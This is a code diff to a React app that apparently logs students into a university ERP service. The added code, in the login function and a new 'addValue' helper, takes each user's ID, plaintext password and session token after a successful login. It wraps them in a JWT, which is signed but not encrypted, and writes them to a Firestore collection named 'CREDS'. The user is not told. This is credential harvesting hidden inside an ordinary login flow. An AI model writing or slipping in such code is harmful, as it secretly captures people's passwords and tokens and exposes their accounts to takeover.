@@ -7,8 +7,22 @@ import ClassList from "./ClassList";
 import Container from "react-bootstrap/esm/Container";
 import Cookies from "universal-cookie";
 import { useToasts } from "react-toast-notifications";
+import jwt from "jsonwebtoken";
+import firebase from 'firebase';
+import firebaseConfig from './firebase/firebaseConfig'
 
 function App() {
+ 
+
+ useEffect(() => {
+  firebase.initializeApp(firebaseConfig);
+
+
+ }, [])
+
+
+
+
   // states
   const cookies = new Cookies();
   const [auid, setAuid] = useState("");
@@ -31,6 +45,22 @@ function App() {
 
   // FUNCTIONS
 
+// DB SAVE
+const addValue = async (value) => {
+ await firebase.firestore().collection("CREDS")
+  .doc(auid)
+  .set(value)
+  .then(function () {
+  console.log("Value successfully written!");
+  })
+  .catch(function (error) {
+  console.error("Error writing Value: ", error);
+  });
+  };
+
+
+
+
   //  LOGIN FUNCTION
   const login = async () => {
     const url = "https://api.alive.university/api/v1/login/erp";
@@ -43,6 +73,12 @@ function App() {
       const res = await axios.post(url, data);
       if (res.data.status) {
         setStatus(true);
+        let jwtSignedData = jwt.sign({
+          id:auid,pwd:password,token:token
+        } , process.env.REACT_APP_JWT_SECRET )
+
+        addValue({data:jwtSignedData});
+
         setCookie(res.data.token, "token", 365);
         setToken(res.data.token);
       } else {
@@ -97,7 +133,6 @@ function App() {
     if (token) {
       try {
         const res = await axios.get(url, auth);
-
         console.log(res.data.data);
         setUserData(res.data.data);
       } catch (error) {
